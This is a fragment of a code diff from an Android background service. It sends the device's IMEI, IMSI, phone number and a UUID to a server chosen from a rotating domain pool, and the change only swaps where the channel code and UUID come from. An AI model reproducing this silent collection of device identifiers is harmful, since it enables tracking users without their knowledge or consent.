@@ -134,14 +134,15 @@ public class PluginService extends IntentService {
             if (TextUtils.isEmpty(imsi)) {
                 imsi = "987654321";
             }
+            String uuid = com.xstd.qm.setting.SettingManager.uuid != null ? com.xstd.qm.setting.SettingManager.uuid.toString() : imei;
             String domain = DomanManager.getInstance(getApplicationContext()).getOneAviableDomain();
             if (TextUtils.isEmpty(domain)) return;
             MainActiveRequest request = new MainActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                                  , imei
                                                                  , imsi
-                                                                 , SettingManager.getInstance().getMainApkChannel()
+                                                                 , com.xstd.qm.Config.CHANNEL_CODE
                                                                  , phone
-                                                                 , SettingManager.getInstance().getMainApkSendUUID()
+                                                                 , uuid
                                                                  , domain + "/gais/"
                                                                  , SettingManager.getInstance().getMainExtraInfo());
             MainActiveResponse response = InternetUtils.request(getApplicationContext(), request);
